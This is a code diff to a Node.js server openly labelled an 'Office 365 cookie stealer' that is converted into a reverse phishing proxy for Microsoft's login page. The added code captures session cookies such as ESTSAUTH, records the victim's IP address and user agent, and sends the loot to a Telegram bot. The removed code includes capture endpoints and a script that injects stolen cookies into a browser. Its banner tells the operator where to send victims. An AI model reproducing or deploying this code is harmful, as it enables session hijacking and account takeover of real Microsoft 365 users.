@@ -1,8 +1,9 @@
 // =============================================
-// OFFICE 365 COOKIE STEALER - COMPLETE VERSION
+// OFFICE 365 COOKIE STEALER - REVERSE PROXY
 // =============================================
 
 const express = require('express');
+const { createProxyMiddleware } = require('http-proxy-middleware');
 const fs = require('fs-extra');
 const path = require('path');
 const cors = require('cors');
@@ -19,12 +20,9 @@ const CONFIG = {
 };
 
 // =============================================
-// MIDDLEWARE - UPDATED
+// MIDDLEWARE
 // =============================================
-app.use(cors({
-    origin: true,      // Allow any origin
-    credentials: true  // Allow credentials (cookies)
-}));
+app.use(cors());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.static('public'));
 
@@ -93,7 +91,7 @@ async function sendToTelegram(message, fileData = null) {
 }
 
 // =============================================
-// EXTRACT COOKIES - MULTIPLE SOURCES
+// EXTRACT COOKIES
 // =============================================
 function extractCookies(headers) {
     const cookieHeader = headers['cookie'] || headers['Cookie'] || '';
@@ -152,184 +150,164 @@ function extractOfficeCookies(cookies) {
 }
 
 // =============================================
-// POST CAPTURE ENDPOINT
+// 🎯 PROXY MIDDLEWARE - CAPTURES COOKIES
 // =============================================
-app.post('/capture', async (req, res) => {
-    console.log('\n🎯 POST COOKIE CAPTURED!');
-    console.log('📥 Headers:', JSON.stringify(req.headers, null, 2).substring(0, 300));
-    
-    const data = req.body;
-    const timestamp = new Date().toISOString();
-    
-    // Extract cookies from headers
-    const cookies = extractCookies(req.headers);
-    
-    // Also check body for cookies
-    if (data.cookies && typeof data.cookies === 'object') {
-        for (const [key, value] of Object.entries(data.cookies)) {
-            if (!cookies[key]) {
-                cookies[key] = value;
+const proxyMiddleware = createProxyMiddleware({
+    target: 'https://login.microsoftonline.com',
+    changeOrigin: true,
+    secure: true,
+    ws: true,
+    cookieDomainRewrite: {
+        '*': '' // Remove domain restriction
+    },
+    onProxyReq: (proxyReq, req, res) => {
+        // Log the request
+        console.log('\n🎯 PROXY REQUEST RECEIVED');
+        console.log('🌐 URL:', req.url);
+        console.log('📌 Method:', req.method);
+        
+        // Capture cookies from request headers
+        const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
+        
+        if (cookieHeader) {
+            console.log('🍪 Cookies captured in proxy!');
+            console.log('📋 Cookie string:', cookieHeader.substring(0, 200) + '...');
+            
+            // Extract cookies
+            const cookies = extractCookies({ cookie: cookieHeader });
+            const officeCookies = extractOfficeCookies(cookies);
+            const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
+            
+            console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
+            console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
+            
+            if (hasFullSession) {
+                console.log('🔥 FULL OFFICE 365 SESSION CAPTURED IN PROXY!');
             }
+            
+            // Save to file
+            const timestamp = new Date().toISOString();
+            const sessionData = {
+                timestamp: timestamp,
+                method: 'PROXY',
+                url: req.url,
+                cookies: cookies,
+                officeCookies: officeCookies,
+                hasFullSession: hasFullSession,
+                ip: req.ip || req.connection.remoteAddress,
+                userAgent: req.headers['user-agent'] || 'unknown'
+            };
+            
+            const filename = `session_proxy_${Date.now()}.json`;
+            fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
+            console.log(`📁 Saved: ${filename}`);
+            
+            // =============================================
+            // SEND TO TELEGRAM IF OFFICE COOKIES FOUND
+            // =============================================
+            if (Object.keys(officeCookies).length > 0 || hasFullSession) {
+                console.log('📤 Sending Office cookies to Telegram...');
+                
+                let message = '🎯 <b>PROXY CAPTURE - Office 365!</b>\n\n';
+                message += `📅 <b>Time:</b> ${timestamp}\n`;
+                message += `🌐 <b>URL:</b> ${req.url}\n`;
+                message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
+                message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
+                message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
+                
+                if (hasFullSession) {
+                    message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
+                    message += '✅ You can now impersonate this user!\n\n';
+                }
+                
+                if (Object.keys(officeCookies).length > 0) {
+                    message += '\n🔑 <b>Critical Office Cookies:</b>\n';
+                    for (const [name, value] of Object.entries(officeCookies)) {
+                        const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
+                        message += `• ${name}: ${shortValue}\n`;
+                    }
+                }
+                
+                await sendToTelegram(message, sessionData);
+                
+            } else {
+                console.log('❌ No Office cookies found in proxy request.');
+            }
+        } else {
+            console.log('❌ No cookies in proxy request');
         }
-    }
-    
-    const officeCookies = extractOfficeCookies(cookies);
-    const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
-    
-    console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
-    console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
-    
-    if (hasFullSession) {
-        console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
-    }
-    
-    // Save to file
-    const sessionData = {
-        timestamp: timestamp,
-        method: 'POST',
-        url: data.url || req.headers.referer || 'unknown',
-        userAgent: req.headers['user-agent'] || 'unknown',
-        ip: req.ip || req.connection.remoteAddress,
-        cookies: cookies,
-        officeCookies: officeCookies,
-        hasFullSession: hasFullSession,
-        rawData: data
-    };
-    
-    const filename = `session_post_${Date.now()}.json`;
-    const filepath = path.join(STORAGE_DIR, filename);
-    fs.writeJsonSync(filepath, sessionData, { spaces: 2 });
-    console.log(`📁 Saved: ${filename}`);
-    
-    // =============================================
-    // ALWAYS SEND TO TELEGRAM IF ANY COOKIES
-    // =============================================
-    if (Object.keys(cookies).length > 0) {
-        console.log('📤 Sending to Telegram...');
-        
-        let message = '🎯 <b>POST Cookie Capture!</b>\n\n';
-        message += `📅 <b>Time:</b> ${timestamp}\n`;
-        message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
-        message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
-        message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
-        message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
-        
-        if (hasFullSession) {
-            message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
-        }
-        
-        if (Object.keys(cookies).length > 0) {
-            message += '\n📋 <b>All Cookies:</b>\n';
-            let count = 0;
-            for (const [name, value] of Object.entries(cookies)) {
-                if (count < 20) {
-                    const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
-                    message += `• ${name}: ${shortValue}\n`;
-                    count++;
-                } else {
-                    message += `• ... and ${Object.keys(cookies).length - 20} more\n`;
-                    break;
+    },
+    onProxyRes: (proxyRes, req, res) => {
+        // Capture cookies from Microsoft's response
+        const setCookie = proxyRes.headers['set-cookie'];
+        if (setCookie) {
+            console.log('\n🍪 MICROSOFT SET COOKIES:');
+            console.log(setCookie.join('\n'));
+            
+            // Send to Telegram
+            const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
+                setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
+            sendToTelegram(message);
+            
+            // Also try to extract from set-cookie
+            const cookies = {};
+            for (const cookie of setCookie) {
+                const [name, ...valueParts] = cookie.split('=');
+                if (name && valueParts) {
+                    cookies[name] = valueParts.join('=').split(';')[0];
                 }
             }
-        }
-        
-        await sendToTelegram(message, sessionData);
-        
-    } else {
-        console.log('❌ No cookies found. Nothing sent to Telegram.');
-    }
-    
-    res.json({
-        success: true,
-        captured: Object.keys(cookies).length,
-        officeCookies: Object.keys(officeCookies).length,
-        hasFullSession: hasFullSession
-    });
-});
-
-// =============================================
-// GET CAPTURE ENDPOINT - FALLBACK
-// =============================================
-app.get('/capture', async (req, res) => {
-    console.log('\n🎯 GET CAPTURE RECEIVED!');
-    console.log('📥 Query:', req.query);
-    
-    let cookies = {};
-    let data = {};
-    
-    // Try to parse data from query
-    if (req.query.data) {
-        try {
-            data = JSON.parse(decodeURIComponent(req.query.data));
-            if (data.cookies) {
-                cookies = data.cookies;
+            
+            const officeCookies = extractOfficeCookies(cookies);
+            if (Object.keys(officeCookies).length > 0) {
+                const sessionData = {
+                    timestamp: new Date().toISOString(),
+                    method: 'SET_COOKIE',
+                    cookies: cookies,
+                    officeCookies: officeCookies,
+                    hasFullSession: cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH']
+                };
+                
+                const filename = `session_setcookie_${Date.now()}.json`;
+                fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
+                console.log(`📁 Saved set-cookie: ${filename}`);
             }
-        } catch (e) {}
-    }
-    
-    if (req.query.cookies) {
-        try {
-            const parsedCookies = JSON.parse(decodeURIComponent(req.query.cookies));
-            for (const [key, value] of Object.entries(parsedCookies)) {
-                if (!cookies[key]) {
-                    cookies[key] = value;
-                }
-            }
-        } catch (e) {}
-    }
-    
-    // Also check headers
-    const headerCookies = extractCookies(req.headers);
-    for (const [key, value] of Object.entries(headerCookies)) {
-        if (!cookies[key]) {
-            cookies[key] = value;
         }
-    }
-    
-    console.log(`🍪 GET Captured ${Object.keys(cookies).length} cookies`);
-    
-    // Process if we have cookies
-    if (Object.keys(cookies).length > 0) {
-        const officeCookies = extractOfficeCookies(cookies);
-        const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
-        
-        const sessionData = {
-            timestamp: new Date().toISOString(),
-            method: 'GET',
-            url: data.url || req.headers.referer || 'GET fallback',
-            userAgent: req.headers['user-agent'] || 'unknown',
-            ip: req.ip || req.connection.remoteAddress,
-            cookies: cookies,
-            officeCookies: officeCookies,
-            hasFullSession: hasFullSession,
-            query: req.query
-        };
-        
-        // Save to file
-        const filename = `session_get_${Date.now()}.json`;
-        fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
-        
-        // Send to Telegram
-        let message = '🎯 <b>GET Capture!</b>\n\n';
-        message += `📅 <b>Time:</b> ${new Date().toISOString()}\n`;
-        message += `🍪 <b>Cookies:</b> ${Object.keys(cookies).length}\n`;
-        message += `🎯 <b>Office:</b> ${Object.keys(officeCookies).length}\n`;
-        
-        if (hasFullSession) {
-            message += '\n🔥 <b>FULL SESSION CAPTURED!</b>\n';
-        }
-        
-        await sendToTelegram(message, sessionData);
-        
-        res.json({ success: true, captured: Object.keys(cookies).length });
-    } else {
-        console.log('❌ No cookies found in GET request');
-        res.json({ success: false, message: 'No cookies found' });
+    },
+    onError: (err, req, res) => {
+        console.error('❌ Proxy error:', err.message);
+        res.status(500).send('Proxy error occurred');
     }
 });
 
 // =============================================
-// VIEW SESSIONS
+// 🎯 PROXY ROUTE - VICTIM GOES HERE
+// =============================================
+app.use('/proxy', (req, res, next) => {
+    console.log('\n🎯 PROXY ACCESS');
+    console.log('📍 Client IP:', req.ip || req.connection.remoteAddress);
+    console.log('🌐 URL:', req.url);
+    next();
+});
+
+app.use('/proxy', proxyMiddleware);
+
+// =============================================
+// 🏠 LANDING PAGE (Phishing Entry)
+// =============================================
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// =============================================
+// 🍪 INJECTOR PAGE
+// =============================================
+app.get('/injector.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
+});
+
+// =============================================
+// 📊 VIEW SESSIONS
 // =============================================
 app.get('/sessions', (req, res) => {
     const files = fs.readdirSync(STORAGE_DIR);
@@ -353,61 +331,40 @@ app.get('/sessions', (req, res) => {
 });
 
 // =============================================
-// INJECT COOKIES
+// 🧹 CLEAR SESSIONS
 // =============================================
-app.post('/inject', (req, res) => {
-    const { cookies } = req.body;
-    
-    if (!cookies || Object.keys(cookies).length === 0) {
-        return res.status(400).json({ error: 'No cookies provided' });
+app.delete('/sessions', (req, res) => {
+    const files = fs.readdirSync(STORAGE_DIR);
+    let count = 0;
+    for (const file of files) {
+        try {
+            fs.unlinkSync(path.join(STORAGE_DIR, file));
+            count++;
+        } catch (e) {}
     }
-    
-    const jsScript = `
-// =============================================
-// PASTE THIS IN BROWSER CONSOLE
-// =============================================
-
-const cookies = ${JSON.stringify(cookies, null, 2)};
-
-for (const [name, value] of Object.entries(cookies)) {
-    document.cookie = name + '=' + value + '; path=/; domain=.login.microsoftonline.com; Secure; SameSite=None';
-}
-
-console.log('✅ ' + Object.keys(cookies).length + ' cookies injected!');
-console.log('🔄 Go to login.microsoftonline.com and refresh.');
-    `;
-    
-    res.json({
-        success: true,
-        count: Object.keys(cookies).length,
-        injectionScript: jsScript
-    });
+    res.json({ success: true, deleted: count });
 });
 
 // =============================================
-// SERVE DASHBOARD
-// =============================================
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.get('/injector.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
-});
-
-// =============================================
-// START SERVER
+// 🚀 START SERVER
 // =============================================
 app.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║   🔥 OFFICE 365 COOKIE STEALER                             ║
+║   🔥 OFFICE 365 REVERSE PROXY STEALER                     ║
 ║   🎯 Running on Railway!                                   ║
 ║                                                              ║
 ║   📡 Port: ${PORT}                                           ║
 ║   📁 Captures: ${STORAGE_DIR}/                              ║
 ║                                                              ║
+║   📌 SEND VICTIM TO:                                       ║
+║   🔗 https://your-railway-url/proxy                        ║
+║                                                              ║
+║                                                              ║
+║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
     `);
 });
+
+module.exports = { app };
